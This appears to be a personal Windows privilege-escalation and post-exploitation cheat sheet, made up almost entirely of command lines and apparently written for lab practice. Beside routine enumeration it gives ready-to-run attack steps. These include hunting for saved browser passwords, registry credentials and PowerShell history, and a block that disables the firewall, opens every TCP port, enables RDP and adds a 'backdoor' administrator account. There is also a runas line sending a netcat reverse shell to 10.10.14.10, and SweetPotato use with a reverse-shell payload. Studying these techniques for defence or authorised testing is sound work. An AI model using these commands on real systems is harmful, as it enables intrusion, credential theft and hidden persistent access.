
Manual  Enumeration 

```sh
# Current user info.
C> whoami
C> whoami /groups
C> whoami /priv
c>whoami /fqdn #domain

#check domain
PS C:\Users\Anakin> (Get-ADDomain).DNSRoot
contoso.local

#change password 
PSC> Set-LocalUser -Name "Username" -Password (ConvertTo-SecureString -AsPlainText "NewPassword" -Force)

#start and stop services
net stop <service_name>
net start <servcice_name>

sc stop <servcice_name>
sc start <servcice_name>

Start-Service -Name "ServiceName"
Stop-Service -Name "KiteService"

tasklist /svc | findstr "KiteService"
taskkill /f /pid [PID]


#check services
sc qc 
sc qc <servcice_name>
sc qc | findstr /i "apache"

wmic service get name,state,startmode
wmic service where "state='running'" get name,state,startmode
wmic service where "name='KiteService'" call stopservice

Get-Service
Get-Service -Name "KiteService"
Get-Service | Where-Object {$_.DisplayName -like "*Apache*"} | Format-List Name,DisplayName

Get-WmiObject Win32_Service -Filter "Name='KiteService'"

#start Service 
net start | findstr "KiteService"

#check schedules tasks
tasklist /svc | findstr "svchost"

#check service priv
PSC> Get-WmiObject Win32_Service -Filter "Name='<service_name>'" | Select Name, State, StartMode, StartName, PathName

#Folder Path Listing
tree /f /a <File>

#grep

something | findstr /i username

# Current user info (PS).
PSC> powershell
PSC> Get-LocalUser
PSC> Get-LocalGroup
PSC> Get-LocalGroupMember Administrators
PSC> (Get-WmiObject Win32_ComputerSystem).Domain #Domain 

# OS info.
PSC> systeminfo

# Netowrk info.
PSC> ipconfig /all
PSC> netstat -ano 
PSC> route print

# Process.
PSC> Get-Process

# Installed applications.
PSC> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //32bit

PSC> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //64bit


# Search file.
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# find files wit these extensions
findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml


#config files 
Get-ChildItem -Path C:\ -Include web.config,conn.php,config.php,settings.py -File -Recurse -ErrorAction SilentlyContinue

#common paths 
Get-ChildItem -Path "C:\inetpub\","C:\xampp\","C:\wamp\","C:\Apache\" -Include *.config,*.php,*.asp,*.aspx -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName


# Browser saved passwords and backups
Get-ChildItem -Path "C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue

Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db" -ErrorAction SilentlyContinue

Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json" -ErrorAction SilentlyContinue

# Search file contents for password-related keywords
Get-ChildItem -Path C:\Users\ -Include *.txt,*.xml,*.config,*.ini -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $content = Get-Content $_.FullName -ErrorAction SilentlyContinue
    if ($content -match "password|pwd|pass|credential|key|secret") {
        Write-Host "Found in: $($_.FullName)"
    }
}

# Search registry for credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>$null

reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 2>$null


# PowerShell history
Get-ChildItem -Path "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -ErrorAction SilentlyContinue
```


```sh
#public folder shared accross the domain  
net share public=c:\users\public  /Grant:Everyone,FULL

#if there is an issue try to fix the sec permissions
#properties sharing locations  add everyone in the  enter object  

```

```sh

# 1.enable rdp
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 2. Disable Firewall
netsh advfirewall set allprofiles state off


# 3. Set RDP Port (optional)
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v PortNumber /d 3389 /f

# 4. Change Admin Password
net user administrator "password123"

# add user account
net user  backdoor password123 /add

# add backdoor to admin group 
net localgroup Administrators backdoor /add

# 5. Start RDP Services
net start TermService
sc config TermService start= auto

#add rule tcp
netsh advfirewall firewall add rule name="Open All Ports" dir=in action=allow protocol=TCP localport=0-65535


#### Runas Command
runas /user:Administrator /savecred cmd.exe
runas /netonly /user:user@domain

#check credentials
runas /netonly /user:DOMAIN.FQDN\USER "cmd.exe /c nltest /dclist:DOMAIN.FQDN"

```


#### pspy64

Tool that Enumerate processes without root permession

Steps: 
- Enumerate arch to know which binary we need `uname -a`
- download the correct binary
- transfer it from attacker machine `python server`
- execute it on victim machine

#### accesschk

check file permessions 

```ls
.\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
```
#### SweetPotato

`https://github.com/CCob/SweetPotato `

A collection of various native Windows privilege escalation techniques from service accounts to SYSTEM

if we have in the userPriv impersonation enabled we can use this tool to exploit it 

```
sweet.exe -e [exploit mode] '[payload binary]'

payload bindary = reverse tcp shell 
```


#### WinPeas

execute for only services information

```
.\winPEAS.exe quiet serviceinfo
```


- Service Commands
```sh
Get-Service

Get-Service | Select-Object Displayname,Status,ServiceName

Get-CimInstance -ClassName win32_service | Select,State,PathName

#queries the configuration of a Windows service. 
#use in cmd sc
sc qeury | findstr "soemthing"

sc qc "something"

# service create
sc create SimpleService binPath="C:\TEMP"

# service config
sc config <service> binPath="C:\TEMP"

# service permission
sc sdshow <service>

# since sdshow shows SDDL which is hard to read use this bin to read it better 
ConvertFrom-SddlString -Sddl <SDDL>

Get-Service * | Select-Object Displayname,Status,ServiceName, Can*


Start <Service>
Stop <Service>
```

```sh
#NSSM ->  service manager
nssm.exe install <service-name>
```

- RunAs
```sh
#spawns a shell with specific user 
runas /netonly /users:USER1 cmd
```


- Process Commands
```sh
#recursive search in cmd
dir /s /b *.txt

#recursive search in powershell
Get-ChildItem -Recurse -Filter '*.txt' -ErrorAction SilentyContinue

#installed aps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 


#what users we have
net user
net user <User>

#check users in the domain
net user /domain
net user <user> /domain

#auth Checks
icalcs <file>

# Grant Permissions
icalcs  test.txt /grant hostname\username:R /t /c
```

#### UserSwitch 


```shell
cmdkey /list
```

Execute a command in **Runas**

```shell
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Users\security\nc.exe -e cmd.exe 10.10.14.10 1337"
```



https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1


```shell
Invoke-RunasCs svc_mssql trustno1 'cmd.exe /c whoami'
```


```shell 
PS C:\Users\dave> $password = ConvertTo-SecureString "pwd123" -AsPlainText -Force

PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

PS C:\Users\dave>  Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred [CLIENTWK220]:

```
#### Serivce DLL ENUM

```sh
Listdlls64.exe  /acceteula <serviceName>
```

- https://learn.microsoft.com/en-us/sysinternals/downloads/listdlls
- https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
- https://malicious.link/posts/2020/compiling-a-dll-using-mingw/